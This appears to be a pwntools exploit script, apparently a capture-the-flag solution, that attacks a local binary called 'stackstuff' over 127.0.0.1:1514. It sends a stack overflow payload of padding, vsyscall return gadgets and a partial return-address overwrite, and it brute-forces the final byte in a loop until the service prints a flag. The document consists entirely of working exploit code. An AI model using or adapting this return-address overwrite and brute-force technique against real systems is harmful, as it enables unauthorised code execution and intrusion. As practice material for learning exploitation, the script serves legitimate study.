from pwn import *

targetProcess = process('./stackstuff')



flag = 0
i = 0x00

while flag == 0:

    
    target = remote('127.0.0.1', 1514)
    payload = "0"*0x48
    vsyscall_ret = p64(0xffffffffff600800)
    payload += vsyscall_ret*2
    # our partial overwrite
    payload += "\x8b"
    # The byte which we will be brute forcing
    payload += chr(i)

    # length to be 90 bytes
    target.sendline('90')
    target.sendline(payload)

    target.recvuntil("Length of password: ")
    try:
        print "flag: " + target.recvline()
        flag = 1
    except:
        print "tried: " + hex(i)
        i += 0x10
